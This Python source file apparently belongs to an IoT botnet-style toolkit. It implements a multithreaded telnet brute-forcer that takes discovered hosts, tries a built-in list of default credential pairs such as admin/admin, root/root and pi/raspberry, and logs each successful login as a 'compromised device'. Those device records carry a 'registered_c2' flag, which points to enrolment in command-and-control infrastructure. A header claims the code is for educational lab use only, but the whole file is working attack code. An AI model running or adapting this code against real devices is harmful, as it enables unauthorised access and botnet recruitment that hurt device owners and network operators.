#!/usr/bin/env python3
"""
IoT Security Research - Telnet Brute Force Module (Optimized)
Educational Purpose Only - For Controlled Lab Environment
"""

import socket
import telnetlib
import logging
import re
import threading
import time
import concurrent.futures
from datetime import datetime
from credentials import get_credentials

# Try to import the fast C extension
try:
    import fast_telnet_bruteforce
    FAST_MODE_AVAILABLE = True
    print("[INFO] Fast C extension loaded - using high-performance mode")
except ImportError:
    FAST_MODE_AVAILABLE = False
    print("[INFO] Fast C extension not available - using Python mode")


class TelnetBruteForcer:
    """Handles telnet brute force attacks"""
    
    def __init__(self, logger=None, max_threads=20):
        self.logger = logger or logging.getLogger(__name__)
        self.compromised_devices = []
        self.load_credentials()
        self.use_fast_mode = FAST_MODE_AVAILABLE
        self.max_threads = max_threads  # Configurable thread count
    
    def load_credentials(self):
        """Load credentials from external file"""
        try:
            self.credentials = get_credentials()
            self.log(f"Loaded {len(self.credentials)} credential pairs from credentials.py")
        except ImportError:
            self.log("Warning: Could not import credentials.py, using fallback credentials")
            # Minimal fallback credentials if file is not available
            self.credentials = [
                ("ipcamadmin", "admin"),      # Digital IPCam credentials
                ("temphumidadmin", "admin"),  # Digital TempHumidSensor credentials
                ("admin", "admin"),
                ("root", "root"), 
                ("admin", "password"),
                ("admin", "123456"),
                ("root", "admin"),
                ("pi", "raspberry"),
                ("ubuntu", "ubuntu")
            ]
    
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.logger.info(f"[BruteForcer] {message}")
        print(f"[{timestamp}] {message}")
    
    def attempt_telnet_login(self, host, port, username, password):
        """Attempt to login via telnet with given credentials"""
        try:
            tn = telnetlib.Telnet(host, port, timeout=10)
            
            try:
                # Read initial prompt/banner
                initial_response = tn.read_until(b"login:", timeout=10)
                if not initial_response:
                    # Try alternative prompts
                    tn.write(b"\n")
                    initial_response = tn.read_very_eager()
                
                # Send username
                tn.write(username.encode() + b"\n")
                
                # Wait for password prompt
                password_prompt = tn.read_until(b"password:", timeout=10)
                if not password_prompt:
                    # Try alternative password prompts
                    password_prompt = tn.read_until(b"Password:", timeout=5)
                
                # Send password
                tn.write(password.encode() + b"\n")
                
                # Read response to check for successful login
                response = tn.read_until(b"#", timeout=15)
                if not response:
                    response = tn.read_until(b"$", timeout=10)
                if not response:
                    response = tn.read_very_eager()
                
                # Define success patterns (shell prompts)
                success_patterns = [
                    b"#", b"$",  # Basic shell prompts
                    b"$ ", b"# ",  # Basic shell prompts (but only with space after)
                    b"admin@", b"root@", b"user@", b"ipcamadmin@", b"temphumidadmin@",  # Specific user prompts
                    b"menu>", b"Main Menu", b"BusyBox",  # Device-specific prompts
                    b"~$ ", b"~# ", b"~]$ ", b"~]# "  # Additional common shell patterns
                ]
                
                failure_patterns = [
                    b"incorrect", b"failed", b"invalid", b"denied", 
                    b"Login incorrect", b"Access denied", b"Authentication failed",
                    b"wrong", b"error", b"failure", b"not recognized",
                    b"login failed", b"access denied", b"authentication failed",
                    b"permission denied", b"login attempt failed"
                ]
                
                # Check for success patterns
                response_lower = response.lower()
                
                # First check for failure patterns (more specific)
                for pattern in failure_patterns:
                    if pattern in response_lower:
                        self.log(f"[FAIL] Login failed for {host} with '{username}':'{password}' - Authentication rejected")
                        tn.close()
                        return False
                
                # Then check for success patterns
                for pattern in success_patterns:
                    if pattern in response:
                        self.log(f"[SUCCESS] Login successful for {host} with '{username}':'{password}'")
                        tn.close()
                        return True
                  # If no clear success/failure pattern, assume failure
                self.log(f"[FAIL] Login failed for {host} with '{username}':'{password}' - No clear shell prompt")
                tn.close()
                return False
                
            except Exception as e:
                self.log(f"[FAIL] Telnet interaction failed for {host}: {e}")
                tn.close()
                return False
                
        except Exception as e:
            self.log(f"[FAIL] Telnet connection failed for {host}: {e}")
            return False

    def brute_force_telnet(self, scan_results):
        """Brute force telnet credentials for discovered devices with optimized performance"""
        if not scan_results:
            self.log("No scan results available. Please run a scan first.")
            return []
            
        # Filter for telnet services
        telnet_targets = [target for target in scan_results 
                         if target['service'].lower() == 'telnet' and target['port'] == 23]
        
        if not telnet_targets:
            self.log("No telnet services found in scan results.")
            return []
            
        self.log(f"Found {len(telnet_targets)} telnet targets to brute force")
        
        # Use fast C extension if available
        if self.use_fast_mode and FAST_MODE_AVAILABLE:
            return self._brute_force_fast_mode(telnet_targets)
        else:
            return self._brute_force_threaded_mode(telnet_targets)

    def _brute_force_fast_mode(self, telnet_targets):
        """High-performance brute force using C extension"""
        self.log(f"Using FAST MODE (C extension) with {len(telnet_targets)} targets")
        start_time = time.time()
        
        try:
            # Use the C extension for maximum performance
            results = fast_telnet_bruteforce.fast_telnet_brute_force(
                telnet_targets, 
                self.credentials,
                self.max_threads
            )
            
            # Process results
            for result in results:
                device_info = {
                    'ip': result['ip'],
                    'username': result['username'],
                    'password': result['password'],
                    'status': 'online',
                    'registered_c2': False,
                    'device_type': 'unknown',
                    'timestamp': datetime.now().isoformat(),
                    'method': 'fast_c_extension'
                }
                self.compromised_devices.append(device_info)
                self.log(f"[SUCCESS] {result['ip']} compromised with '{result['username']}':'{result['password']}'")
            
            elapsed_time = time.time() - start_time
            self.log(f"Fast mode completed in {elapsed_time:.2f}s - {len(results)}/{len(telnet_targets)} devices compromised")
            
            return self.compromised_devices
            
        except Exception as e:
            self.log(f"Fast mode failed: {e}, falling back to threaded mode")
            return self._brute_force_threaded_mode(telnet_targets)

    def _brute_force_threaded_mode(self, telnet_targets):
        """Multi-threaded brute force using Python threads"""
        self.log(f"Using THREADED MODE with {self.max_threads} threads for {len(telnet_targets)} targets")
        start_time = time.time()
        
        # Create a thread pool for parallel processing
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # Submit all brute force tasks
            future_to_target = {}
            
            for target in telnet_targets:
                future = executor.submit(self._brute_force_single_target, target)
                future_to_target[future] = target
            
            # Collect results as they complete
            completed_count = 0
            total_targets = len(telnet_targets)
            
            for future in concurrent.futures.as_completed(future_to_target):
                target = future_to_target[future]
                completed_count += 1
                
                try:
                    result = future.result()
                    if result:
                        self.compromised_devices.append(result)
                        self.log(f"[SUCCESS] Progress: {completed_count}/{total_targets} - {target['ip']} compromised")
                    else:
                        self.log(f"[FAIL] Progress: {completed_count}/{total_targets} - {target['ip']} brute force failed")
                        
                except Exception as e:
                    self.log(f"[ERROR] Target {target['ip']} raised exception: {e}")
        
        elapsed_time = time.time() - start_time
        success_count = len(self.compromised_devices)
        self.log(f"Threaded mode completed in {elapsed_time:.2f}s - {success_count}/{total_targets} devices compromised")
        
        return self.compromised_devices

    def _brute_force_single_target(self, target):
        """Brute force a single target with all credentials"""
        target_ip = target['ip']
        
        for username, password in self.credentials:
            if self.attempt_telnet_login_optimized(target_ip, 23, username, password):
                return {
                    'ip': target_ip,
                    'username': username,
                    'password': password,
                    'status': 'online',
                    'registered_c2': False,
                    'device_type': 'unknown',
                    'timestamp': datetime.now().isoformat(),
                    'method': 'threaded_python'
                }
        
        return None

    def attempt_telnet_login_optimized(self, host, port, username, password):
        """Optimized telnet login attempt with faster timeouts"""
        try:
            # Use shorter timeouts for faster scanning
            tn = telnetlib.Telnet()
            tn.open(host, port, timeout=5)  # Reduced from 10 to 5 seconds
            
            try:
                # Read initial prompt with shorter timeout
                initial_response = tn.read_until(b"login:", timeout=3)  # Reduced from 10 to 3
                if not initial_response:
                    tn.write(b"\n")
                    initial_response = tn.read_very_eager()
                
                # Send username quickly
                tn.write(username.encode() + b"\n")
                
                # Wait for password prompt with shorter timeout
                password_prompt = tn.read_until(b"password:", timeout=3)  # Reduced from 10 to 3
                if not password_prompt:
                    password_prompt = tn.read_until(b"Password:", timeout=2)
                
                # Send password
                tn.write(password.encode() + b"\n")
                
                # Check response quickly
                response = tn.read_until(b"#", timeout=5)  # Reduced from 15 to 5
                if not response:
                    response = tn.read_until(b"$", timeout=3)
                if not response:
                    response = tn.read_very_eager()
                
                # Quick pattern matching
                success_patterns = [b"#", b"$", b"@", b"~", b"menu>", b"BusyBox"]
                failure_patterns = [b"incorrect", b"failed", b"invalid", b"denied"]
                
                response_lower = response.lower()
                
                # Check for failure first (faster)
                for pattern in failure_patterns:
                    if pattern in response_lower:
                        tn.close()
                        return False
                
                # Check for success patterns
                for pattern in success_patterns:
                    if pattern in response:
                        tn.close()
                        return True
                
                tn.close()
                return False
                
            except Exception:
                tn.close()
                return False
                
        except Exception:
            return False
    
    def get_compromised_devices(self):
        """Return list of compromised devices"""
        return self.compromised_devices
    
    def clear_devices(self):
        """Clear compromised devices list"""
        self.compromised_devices = []
